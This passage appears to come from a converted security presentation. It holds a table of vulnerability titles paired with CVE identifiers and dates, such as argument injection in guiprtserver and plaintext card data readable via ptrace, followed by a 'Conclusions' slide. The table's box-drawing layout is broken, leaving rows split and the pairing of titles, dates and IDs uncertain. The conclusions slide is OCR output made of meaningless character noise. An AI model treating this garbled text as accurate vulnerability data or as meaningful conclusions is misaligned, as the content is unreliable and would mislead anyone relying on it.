`├──────────────────────────────────────────────────────────────────┼────────────`|`│2024-01-17  │CVE-2023-7348 │`
`┼────────────┼──────────────┤`|
|`│Insufficient validation of symbolic links in update archive files│2023-10-31`
`├──────────────────────────────────────────────────────────────────┼────────────`|`│2024-01-17  │CVE-2023-7349 │`
`┼────────────┼──────────────┤`|
|`│Lax Grsecurity Configuration│2023-12-31`
`├──────────────────────────────────────────────────────────────────┼────────────`|`│2024-12-09  │CVE-2023-7350 │`
`┼────────────┼──────────────┤`|
|`│Plaintext Magstripe PAN Data Obtainable via PTRACE│2023-12-31`
`├──────────────────────────────────────────────────────────────────┼────────────`|`│N/A         │CVE-2023-7351 │`
`┼────────────┼──────────────┤`|
|`│Argument Injection in guiprtserver│2024-09-30`
`├──────────────────────────────────────────────────────────────────┼────────────`|`│2024-12-09  │CVE-2024-14038│`
`┼────────────┼──────────────┤`|
|`│Unintended function call via svc_netcontrol                       │2024-09-30`
`├──────────────────────────────────────────────────────────────────┼────────────`|`│2024-12-09  │CVE-2024-14039│`
`┼────────────┼──────────────┤`|
|`│Argument Injection in libsvc_net (ntpd)`
`│2025-03-31`
`└──────────────────────────────────────────────────────────────────┴────────────`|`│2025-05-09  │CVE-2025-15670│`
`┴────────────┴──────────────┘`|

```
* Approximate dates
```

## Slide 75

Conclusions

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Conclusions
‘a. at gd ppl —-0 abe
feerens) IF “) “Weare 96 ~-&oe ot i
552
eee soy > MI YN
VauB exe ays fk 7S a
Fee Cg) (mY -cy ras* (Cf
a
oA Fobes 7 eee Fx
(Firm SE be! bm -
Noose] re¢
a = Fe¥ayl €
```
